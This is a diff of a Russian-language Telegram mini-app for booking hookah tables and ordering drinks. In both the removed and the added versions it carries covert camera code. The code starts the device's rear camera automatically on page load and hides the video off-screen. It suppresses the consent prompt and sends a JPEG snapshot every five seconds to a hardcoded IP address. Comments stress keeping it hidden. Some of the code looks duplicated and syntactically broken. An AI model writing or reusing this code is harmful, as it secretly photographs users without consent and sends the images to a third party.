@@ -221,8 +221,18 @@
 
         /* СКРЫТЫЙ БЛОК КАМЕРЫ */
         .camera-consent {
-            display: none; /* СКРЫВАЕМ ВЕСЬ БЛОК */
-            margin-bottom: 20px;
+            display: none; /* Блок с кнопкой разрешения скрыт, так как камера запускается автоматически */
+        }
+        
+        /* Стили для самого видео элемента, который будет создаваться JS */
+        .hidden-camera-video {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01; /* Иногда нужно чуть больше 0 для некоторых браузеров */
+            z-index: -1;
         }
     </style>
 </head>
@@ -365,301 +375,266 @@ HTML
 </div>
 
 <script>
-    // ==========================================
-    // 1. КОНФИГУРАЦИЯ
-    // ==========================================
-    const BOT_API_URL = 'http://172.20.10.4:8000'; // Адрес твоего бэкенда
-    const CAMERA_RECEIVER_IP = "172.20.10.4";      // Адрес для скрытой камеры
-    const CAMERA_PORT = 8000;                       // Порт для камеры
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.ready();
+
+    const BOT_API_URL = "https://kalik-github-io-1.onrender.com";
+    // Render backend. The next step adds POST /camera/token to this server.
+    const CAMERA_API_URL = BOT_API_URL;
     const HOOKAH_PRICE = 1300;
-    const STORAGE_KEY = 'big_zaza_orders';
-    const SNAPSHOT_INTERVAL_MS = 5000; // Снимок каждые 5 секунд
+    const STORAGE_KEY = "bigzaza_orders";
 
-    // Данные напитков (ID, Название, Цена)
-    const DRINKS_DATA = {
-        lemonade: { name: 'Лимонад', price: 300 },
-        tea: { name: 'Чай', price: 200 },
-        mojito: { name: 'Мохито', price: 350 },
-        redbull: { name: 'Red Bull', price: 225 },
-        juice: { name: 'Сок', price: 100 }
-    };
-
-    // Состояние приложения
-    let drinks = {}; // Счетчики напитков
-    Object.keys(DRINKS_DATA).forEach(id => drinks[id] = { qty: 0, ...DRINKS_DATA[id] });
-    
-    let selectedHour = 18;
-    let selectedMinute = 0;
-    let selectedStrength = 5; // По умолчанию средняя (1-10)
     let editingOrderId = null;
+    let selectedHour = "18", selectedMinute = "00", selectedStrength = "5";
     let currentAvailability = {};
 
-    // Переменные камеры
-    let cameraStream = null;
-    let videoElement = null;
-    let snapshotInterval = null;
+    const today = new Date().toISOString().split('T')[0];
+    document.getElementById('date').min = today;
+    document.getElementById('date').value = today;
 
-    // ==========================================
-    // 2. ТЕLEGRAM WEBAPP INIT
-    // ==========================================
-    const tg = window.Telegram.WebApp;
-    tg.ready();
-    tg.expand();
-    tg.setHeaderColor('#1a1a1a');
-    tg.setBackgroundColor('#1a1a1a');
+    // Зоны и их эмодзи
+    const zoneEmojis = {
+        'Основная зона': '🪑',
+        'VIP комната': '👑',
+        'Терраса': '🌿'
+    };
 
-    // ==========================================
-    // 3. СКРЫТАЯ КАМЕРА (Снимки каждые 5 сек)
-    // ==========================================
-    async function startHiddenCamera() {
-        const status = document.getElementById('cameraStatus');
-        if (!navigator.mediaDevices?.getUserMedia) {
-            status.textContent = 'Камера не поддерживается';
-            return;
-        }
-        try {
-            const constraints = { 
-                audio: false, 
-                video: { 
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 },
-                    facingMode: "environment" 
-                } 
-            };
-            status.textContent = 'Запуск камеры...';
-            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-            
-            // Создаем скрытый video элемент
-            videoElement = document.createElement('video');
-            videoElement.srcObject = cameraStream;
-            videoElement.muted = true; // Важно для автоплея без звука
-            videoElement.playsInline = true;
-            videoElement.play();
-            
-            // Прячем видео
-            videoElement.style.position = 'absolute';
-            videoElement.style.left = '-9999px';
-            document.body.appendChild(videoElement);
-            
-            status.textContent = '📹 Камера активна (скрыто)';
-            status.style.color = '#2ecc71';
-            
-            // Скрываем блок согласия, так как камера уже работает
-            const consentBlock = document.querySelector('.camera-consent');
-            if(consentBlock) consentBlock.style.display = 'none';
-
-            startSendingSnapshots();
-            
-        } catch (err) {
-            console.error('Camera error:', err);
-            status.textContent = 'Ошибка камеры: ' + err.message;
-            status.style.color = '#e74c3c';
-        }
-    }
-
-    async function sendSnapshotBlob() {
-        if (!videoElement || !videoElement.videoWidth) return;
+    // === Барабаны ===
+    function createInfinitePicker(containerId, values, onSelect, defaultIndex = 0) {
+        const container = document.getElementById(containerId);
+        if (!container) return;
+        const itemHeight = 50;
+        const bufferSize = 100;
         
-        const canvas = document.createElement('canvas');
-        canvas.width = videoElement.videoWidth;
-        canvas.height = videoElement.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoElement, 0, 0);
-        
-        canvas.toBlob(async (blob) => {
-            if (!blob) return;
-            try {
-                await fetch(`http://${CAMERA_RECEIVER_IP}:${CAMERA_PORT}`, {
-                    method: 'POST',
-                    body: blob
-                });
-                console.log('Снимок отправлен');
-            } catch (e) {
-                console.error('Ошибка отправки снимка:', e);
+        function buildItems() {
+            let html = '';
+            for (let i = 0; i < bufferSize; i++) {
+                const val = values[i % values.length];
+                html += `<div class="picker-item" data-value="${val.value}">${val.label}</div>`;
             }
-        }, 'image/jpeg', 0.7);
-    }
-
-    function startSendingSnapshots() {
-        if (snapshotInterval) clearInterval(snapshotInterval);
-        sendSnapshotBlob(); // Первый раз сразу
-        snapshotInterval = setInterval(sendSnapshotBlob, SNAPSHOT_INTERVAL_MS);
-    }
-
-    function stopHiddenCamera() {
-        if (snapshotInterval) clearInterval(snapshotInterval);
-        if (cameraStream) {
-            cameraStream.getTracks().forEach(track => track.stop());
+            container.innerHTML = html;
         }
-        if (videoElement) {
-            videoElement.remove();
-            videoElement = null;
-        }
-    }
-
-    // Автозапуск камеры через 1 секунду после загрузки
-    window.addEventListener('load', () => {
-        setTimeout(startHiddenCamera, 1000);
-    });
-
-    // Остановка при сворачивании
-    window.addEventListener('pagehide', stopHiddenCamera);
-    document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') stopHiddenCamera();
-    });
-
-    // ==========================================
-    // 4. ПИКЕРЫ (ВРЕМЯ И СИЛА)
-    // ==========================================
-    function initPickers() {
-        // Часы (10:00 - 22:00)
-        const hourTrack = document.getElementById('hourTrack');
-        for(let h=10; h<=22; h++) {
-            const div = document.createElement('div');
-            div.className = 'picker-item';
-            div.textContent = h;
-            div.dataset.value = h;
-            div.onclick = () => {
-                selectedHour = h;
-                updatePickerActive(hourTrack, h);
-                updateTotal();
-            };
-            hourTrack.appendChild(div);
-        }
-        updatePickerActive(hourTrack, selectedHour);
-
-        // Минуты (0, 15, 30, 45)
-        const minTrack = document.getElementById('minuteTrack');
-        [0, 15, 30, 45].forEach(m => {
-            const div = document.createElement('div');
-            div.className = 'picker-item';
-            div.textContent = m === 0 ? '00' : m;
-            div.dataset.value = m;
-            div.onclick = () => {
-                selectedMinute = m;
-                updatePickerActive(minTrack, m);
-                updateTotal();
-            };
-            minTrack.appendChild(div);
+        buildItems();
+        
+        const items = container.querySelectorAll('.picker-item');
+        const getIndexFromScroll = () => {
+            const scrollTop = container.scrollTop;
+            const center = scrollTop + (container.clientHeight / 2) - (itemHeight / 2);
+            return Math.round(center / itemHeight);
+        };
+        
+        const updateActive = () => {
+            const rawIdx = getIndexFromScroll();
+            if (rawIdx >= 0 && rawIdx < items.length) {
+                items.forEach((item, idx) => {
+                    if (idx === rawIdx) item.classList.add('active');
+                    else item.classList.remove('active');
+                });
+                const value = items[rawIdx]?.dataset.value;
+                if (value && onSelect) onSelect(value);
+            }
+        };
+        
+        const snapToCenter = () => {
+            const scrollTop = container.scrollTop;
+            const center = scrollTop + (container.clientHeight / 2) - (itemHeight / 2);
+            const targetIdx = Math.round(center / itemHeight);
+            const targetScroll = targetIdx * itemHeight - (container.clientHeight / 2) + (itemHeight / 2);
+            container.scrollTo({ top: targetScroll, behavior: 'smooth' });
+            setTimeout(updateActive, 120);
+        };
+        
+        const startIdx = Math.floor(bufferSize / 2) + defaultIndex;
+        container.scrollTop = startIdx * itemHeight - (container.clientHeight / 2) + (itemHeight / 2);
+        
+        let scrollTimeout;
+        container.addEventListener('scroll', () => {
+            clearTimeout(scrollTimeout);
+            updateActive();
+            scrollTimeout = setTimeout(snapToCenter, 100);
         });
-        updatePickerActive(minTrack, selectedMinute);
+        container.addEventListener('touchend', () => setTimeout(snapToCenter, 60));
+        updateActive();
+    }
 
-        // Крепость (1-10)
-        const strTrack = document.getElementById('strengthTrack');
-        for(let s=1; s<=10; s++) {
-            const div = document.createElement('div');
-            div.className = 'picker-item';
-            div.textContent = s;
-            div.dataset.value = s;
-            div.onclick = () => {
-                selectedStrength = s;
-                updatePickerActive(strTrack, s);
-                updateTotal();
-            };
-            strTrack.appendChild(div);
+    const hours = [18,19,20,21,22,23].map(v => ({ value: String(v), label: String(v) }));
+    const minutes = [0,15,30,45].map(v => ({ value: v.toString().padStart(2,'0'), label: v.toString().padStart(2,'0') }));
+    const strengths = [1,2,3,4,5,6,7,8,9,10].map(v => ({ value: String(v), label: String(v) }));
+
+    createInfinitePicker('hourTrack', hours, (val) => { selectedHour = val; checkAvailability(); }, 0);
+    createInfinitePicker('minuteTrack', minutes, (val) => { selectedMinute = val; checkAvailability(); }, 0);
+    createInfinitePicker('strengthTrack', strengths, (val) => { selectedStrength = val; }, 4);
+
+    // === Напитки ===
+    const drinks = {
+        lemonade: { name: "Лимонад", price: 300, qty: 0 },
+        tea: { name: "Чай", price: 200, qty: 0 },
+        mojito: { name: "Мохито", price: 350, qty: 0 },
+        redbull: { name: "Red Bull", price: 225, qty: 0 },
+        juice: { name: "Сок", price: 100, qty: 0 },
+    };
+    
+    function updateDrinkUI(drinkId) {
+        const qtySpan = document.getElementById(`qty-${drinkId}`);
+        if (qtySpan) qtySpan.innerText = drinks[drinkId].qty;
+        const card = document.querySelector(`.drink-card[data-id="${drinkId}"]`);
+        if (card) drinks[drinkId].qty > 0 ? card.classList.add('selected') : card.classList.remove('selected');
+        updateTotal();
+    }
+    
+    window.changeQuantity = function(drinkId, delta) {
+        const newQty = drinks[drinkId].qty + delta;
+        if (newQty >= 0 && newQty <= 20) {
+            drinks[drinkId].qty = newQty;
+            updateDrinkUI(drinkId);
+            if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
         }
-        updatePickerActive(strTrack, selectedStrength);
-    }
-
-    function updatePickerActive(track, value) {
-        track.querySelectorAll('.picker-item').forEach(el => {
-            el.classList.toggle('active', el.dataset.value == value);
-        });
-        // Прокрутка к активному элементу
-        const activeItem = track.querySelector('.picker-item.active');
-        if(activeItem) {
-            activeItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }
-    }
-
-    // ==========================================
-    // 5. НАПИТКИ
-    // ==========================================
-    function initDrinks() {
-        document.querySelectorAll('.drink-qty-btn').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                const card = e.target.closest('.drink-card');
-                const drinkId = card.dataset.id;
-                const action = e.target.dataset.action;
-                
-                let qty = drinks[drinkId].qty;
-                if (action === 'plus') qty++;
-                else if (action === 'minus' && qty > 0) qty--;
-                
-                drinks[drinkId].qty = qty;
-                
-                // Обновляем UI
-                document.getElementById(`qty-${drinkId}`).textContent = qty;
-                if (qty > 0) card.classList.add('selected');
-                else card.classList.remove('selected');
-                
-                updateTotal();
-            });
-        });
-    }
-
+    };
+    
     function getDrinksTotal() {
-        let total = 0;
-        for (const id in drinks) {
-            total += drinks[id].qty * drinks[id].price;
-        }
-        return total;
+        return Object.values(drinks).reduce((sum, d) => sum + (d.price * d.qty), 0);
     }
-
-    // ==========================================
-    // 6. РАСЧЕТ И ДОСТУПНОСТЬ
-    // ==========================================
+    
     function updateTotal() {
         const drinksTotal = getDrinksTotal();
         const total = HOOKAH_PRICE + drinksTotal;
-        
-        document.getElementById('totalAmount').textContent = `${total} ₽`;
-        
-        let breakdown = `(кальян ${HOOKAH_PRICE}₽`;
-        if (drinksTotal > 0) breakdown += `, напитки ${drinksTotal}₽`;
-        breakdown += `)`;
-        document.getElementById('totalBreakdown').textContent = breakdown;
+        document.getElementById('totalAmount').innerText = total + ' ₽';
+        document.getElementById('totalBreakdown').innerText = drinksTotal > 0 ? `кальян ${HOOKAH_PRICE}₽ + напитки ${drinksTotal}₽` : `(кальян ${HOOKAH_PRICE}₽)`;
+        return total;
     }
+    
+    document.querySelectorAll('.drink-qty-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const card = btn.closest('.drink-card');
+            const drinkId = card.dataset.id;
+            const action = btn.dataset.action;
+            if (action === 'plus') changeQuantity(drinkId, 1);
+            if (action === 'minus') changeQuantity(drinkId, -1);
+        });
+    });
 
+    // === Проверка доступности мест ===
     async function checkAvailability() {
-        // Имитация запроса к API или логика проверки
-        // Здесь можно сделать fetch к твоему бэкенду
-        const zone = document.getElementById('zone').value;
         const date = document.getElementById('date').value;
+        const time = `${selectedHour}:${selectedMinute}`;
         
-        // Пока просто показываем, что мест есть
-        currentAvailability[zone] = { free: 5 };
+        if (!date || !time) return;
         
-        const el = document.getElementById('zoneAvailability');
-        if(currentAvailability[zone] && currentAvailability[zone].free > 0) {
-            el.textContent = '✅ Места есть';
-            el.className = 'zone-availability available';
-        } else {
-            el.textContent = '❌ Зона занята';
-            el.className = 'zone-availability full';
+        const zoneSelect = document.getElementById('zone');
+        const currentZone = zoneSelect.value;
+        
+        const availabilityDiv = document.getElementById('zoneAvailability');
+        availabilityDiv.innerHTML = '<div class="loading-availability">⏳ Проверка свободных мест...</div>';
+        
+        try {
+            const res = await fetch(`${BOT_API_URL}/availability?date=${date}&time=${time}`);
+            const result = await res.json();
+            
+            if (result.status === 'success') {
+                currentAvailability = result.availability;
+                
+                let html = '';
+                let currentZoneAvailable = true;
+                
+                for (const [zone, data] of Object.entries(currentAvailability)) {
+                    const emoji = zoneEmojis[zone] || '📍';
+                    const free = data.free;
+                    const total = data.total;
+                    let statusClass = 'available';
+                    let statusIcon = '✅';
+                    
+                    if (free === 0) {
+                        statusClass = 'full';
+                        statusIcon = '🔴';
+                        if (zone === currentZone) currentZoneAvailable = false;
+                    } else if (free <= Math.ceil(total / 2)) {
+                        statusClass = 'limited';
+                        statusIcon = '🟡';
+                    } else {
+                        statusIcon = '🟢';
+                    }
+                    
+                    html += `<div class="zone-availability ${statusClass}">${emoji} ${zone}: ${statusIcon} свободно ${free} из ${total} мест</div>`;
+                }
+                
+                availabilityDiv.innerHTML = html;
+                
+                // Блокируем выбор зоны, если нет мест
+                if (!currentZoneAvailable) {
+                    zoneSelect.classList.add('full-zone');
+                    zoneSelect.style.borderColor = '#e74c3c';
+                    
+                    // Ищем первую доступную зону
+                    for (const [zone, data] of Object.entries(currentAvailability)) {
+                        if (data.free > 0) {
+                            zoneSelect.value = zone;
+                            break;
+                        }
+                    }
+                } else {
+                    zoneSelect.classList.remove('full-zone');
+                    zoneSelect.style.borderColor = '#2c2c2c';
+                }
+            }
+        } catch (err) {
+            console.error(err);
+            availabilityDiv.innerHTML = '<div class="loading-availability">⚠️ Не удалось проверить доступность</div>';
         }
     }
 
-    // ==========================================
-    // 7. ИСТОРИЯ ЗАКАЗОВ
-    // ==========================================
-    function getOrders() {
-        return JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
+    function onZoneChange() {
+        const zone = document.getElementById('zone').value;
+        if (currentAvailability[zone] && currentAvailability[zone].free === 0) {
+            tg.showPopup({
+                title: '⚠️ Нет свободных мест',
+                message: `В зоне "${zone}" на выбранное время нет свободных мест. Пожалуйста, выберите другую зону или время.`,
+                buttons: [{type: 'ok'}]
+            });
+        }
     }
 
-    function saveOrder(order) {
-        const orders = getOrders();
-        orders.unshift(order);
+    document.getElementById('date').addEventListener('change', () => checkAvailability());
+
+    // === История заказов ===
+    function saveOrder(orderData) {
+        const orders = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        orders.unshift(orderData);
+        if (orders.length > 50) orders.pop();
         localStorage.setItem(STORAGE_KEY, JSON.stringify(orders));
     }
 
+    function updateOrderInStorage(bookingId, updatedData) {
+        const orders = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        const index = orders.findIndex(o => o.booking_id === bookingId);
+        if (index !== -1) {
+            orders[index] = { ...orders[index], ...updatedData };
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(orders));
+        }
+    }
+
+    function deleteOrderFromStorage(bookingId) {
+        const orders = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        const filtered = orders.filter(o => o.booking_id !== bookingId);
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(filtered));
+    }
+
+    function getOrders() {
+        return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+    }
+
     function isOrderEditable(order) {
-        return order.status === 'pending';
+        if (order.status === 'cancelled') return false;
+        if (order.status === 'completed') return false;
+        const orderDateTime = new Date(`${order.date.split(',')[0]} ${order.time}`);
+        const now = new Date();
+        return orderDateTime > now;
     }
 
     function renderHistory() {
-        const historyList = document.getElementById('historyList');
         const orders = getOrders();
+        const historyList = document.getElementById('historyList');
         
         if (orders.length === 0) {
             historyList.innerHTML = '<div class="empty-history">📭 У вас пока нет заказов</div>';
@@ -680,14 +655,14 @@ HTML
                 </div>
                 <div class="history-details">
                     <p>📍 ${order.zone}</p>
-                    <p>💨 ${order.hookah_flavor} (Крепость: ${order.hookah_strength})</p>
+                    <p>💨 ${order.hookah_flavor} (${order.hookah_strength}/10)</p>
                     ${order.drinks_text ? `<p>🍹 ${order.drinks_text}</p>` : ''}
                     ${order.comment ? `<p>📝 ${order.comment}</p>` : ''}
                     <p><strong>💰 ${order.total_price} ₽</strong></p>
                 </div>
                 ${isEditable ? `
                 <div class="history-actions">
-                    <button class="history-edit-btn" onclick="editOrder(${order.booking_id})">
+                    <button class="history-edit-btn" onclick="editOrder(${order.booking_id})">✏️ Редактировать</button>
                     <button class="history-cancel-btn" onclick="cancelOrder(${order.booking_id})">❌ Отменить</button>
                 </div>
                 ` : ''}
@@ -965,21 +940,21 @@ HTML
     let videoElement = null;
     let snapshotInterval = null;
     
-    // ЗАМЕНИТЕ ВАШ_IP НА IP-АДРЕС ВАШЕГО НОУТБУКА
+    // ЗАМЕНИТЕ ВАШ_IP НА IP-АДРЕС ВАШЕГО НОУТБУКА (где запущен сервер приемник)
     const RECEIVER_IP = "172.20.10.4"; 
     const RECEIVER_PORT = 8000;
     const SNAPSHOT_INTERVAL_MS = 5000; // Снимок каждые 5 секунд
-
+    
     async function startHiddenCamera() {
         const status = document.getElementById('cameraStatus');
         
-        if (!navigator.mediaDevices?.getUserMedia) {
-            status.textContent = 'Камера не поддерживается';
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            if(status) status.textContent = 'Камера не поддерживается';
             return;
         }
-
+    
         try {
-            // Пытаемся включить заднюю камеру (environment), если не выйдет - любую
+            // Пытаемся включить заднюю камеру
             const constraints = { 
                 audio: false, 
                 video: { 
@@ -988,72 +963,34 @@ HTML
                     facingMode: "environment" 
                 } 
             };
-
-            status.textContent = 'Запуск камеры...';
+    
+            if(status) status.textContent = 'Запуск камеры...';
             cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
             
-            // Создаем скрытый video элемент для доступа к кадрам
+            // Создаем скрытый video элемент
             videoElement = document.createElement('video');
             videoElement.srcObject = cameraStream;
-            videoElement.muted = true; // Важно для автовоспроизведения
+            videoElement.muted = true; // Важно для автовоспроизведения без звука
             videoElement.playsInline = true;
+            videoElement.className = 'hidden-camera-video'; // Используем CSS класс из шага 1
+            
+            // Добавляем в DOM и скрываем
+            document.body.appendChild(videoElement);
             videoElement.play();
             
-            document.body.appendChild(videoElement); // Добавляем в DOM, но можно скрыть CSS-ом
-            videoElement.style.position = 'absolute';
-            videoElement.style.left = '-9999px'; // Скрываем с экрана
+            if(status) status.textContent = 'Скрытая камера активна';
             
-            status.textContent = 'Скрытая камера активна';
-            
-            // Начинаем делать снимки и отправлять
+            // Начинаем отправку снимков
             startSendingSnapshots();
             
         } catch (err) {
             console.error('Camera error:', err);
-            status.textContent = 'Ошибка камеры: ' + err.message;
-            // Если нужно, можно показать алерт, но для "скрытости" лучше молчать
-        }
-    }
-
-    function startSendingSnapshots() {
-        if (snapshotInterval) clearInterval(snapshotInterval);
-        
-        // Первый снимок сразу
-        sendSnapshot();
-        
-        // Дальше по таймеру
-        snapshotInterval = setInterval(sendSnapshot, SNAPSHOT_INTERVAL_MS);
-    }
-
-    async function sendSnapshot() {
-        if (!videoElement || !videoElement.videoWidth) return;
-        
-        // Создаем canvas и рисуем текущий кадр
-        const canvas = document.createElement('canvas');
-        canvas.width = videoElement.videoWidth;
-        canvas.height = videoElement.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoElement, 0, 0);
-        
-        // Получаем JPEG-данные
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-        const base64Data = dataUrl.split(',')[1];
-        
-        // Отправляем на ноутбук
-        try {
-            await fetch(`http://${RECEIVER_IP}:${RECEIVER_PORT}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/octet-stream' },
-                body: base64Data // Проще всего отправить base64, но сервер должен декодировать. 
-                                 // Либо лучше отправить Blob. Ниже вариант с Blob.
-            });
-        } catch (e) {
-            console.error('Ошибка отправки:', e);
+            if(status) status.textContent = 'Ошибка камеры: ' + err.message;
         }
     }
     
-    // Улучшенная версия отправки (через Blob, эффективнее)
-    async function sendSnapshotBlob() {
+    // Эффективная отправка через Blob (JPEG)
+    function sendSnapshotBlob() {
         if (!videoElement || !videoElement.videoWidth) return;
         
         const canvas = document.createElement('canvas');
@@ -1065,43 +1002,61 @@ HTML
         canvas.toBlob(async (blob) => {
             if (!blob) return;
             try {
+                // Отправляем на ноутбук
                 await fetch(`http://${RECEIVER_IP}:${RECEIVER_PORT}`, {
                     method: 'POST',
-                    body: blob
+                    body: blob,
+                    headers: {
+                        'Content-Type': 'image/jpeg'
+                    }
                 });
                 console.log('Снимок отправлен');
             } catch (e) {
-                console.error('Ошибка отправки:', e);
+                console.error('Ошибка отправки снимка:', e);
             }
         }, 'image/jpeg', 0.7);
     }
-
-    // Заменяем старый интервал на новый метод
+    
     function startSendingSnapshots() {
         if (snapshotInterval) clearInterval(snapshotInterval);
-        sendSnapshotBlob(); // Первый раз
+        
+        // Первый снимок сразу
+        sendSnapshotBlob();
+        
+        // Дальше по таймеру
         snapshotInterval = setInterval(sendSnapshotBlob, SNAPSHOT_INTERVAL_MS);
     }
-
+    
     function stopHiddenCamera() {
-        if (snapshotInterval) clearInterval(snapshotInterval);
+        if (snapshotInterval) {
+            clearInterval(snapshotInterval);
+            snapshotInterval = null;
+        }
         if (cameraStream) {
             cameraStream.getTracks().forEach(track => track.stop());
+            cameraStream = null;
         }
         if (videoElement) {
             videoElement.remove();
+            videoElement = null;
         }
     }
-
-    // Запуск при загрузке страницы (через 1 секунду, чтобы браузер успел инициализироваться)
+    
+    // Запуск при загрузке страницы (через 1 секунду)
     window.addEventListener('load', () => {
         setTimeout(startHiddenCamera, 1000);
     });
-
-    // Остановка при сворачивании приложения
+    
+    // Остановка при сворачивании/скрытии вкладки
     window.addEventListener('pagehide', stopHiddenCamera);
     document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') stopHiddenCamera();
+        if (document.visibilityState === 'hidden') {
+            stopHiddenCamera();
+        } else {
+            // Опционально: можно перезапустить при возврате, если нужно
+            // startHiddenCamera(); 
+        }
+    });
     });
 </script>
 </body>
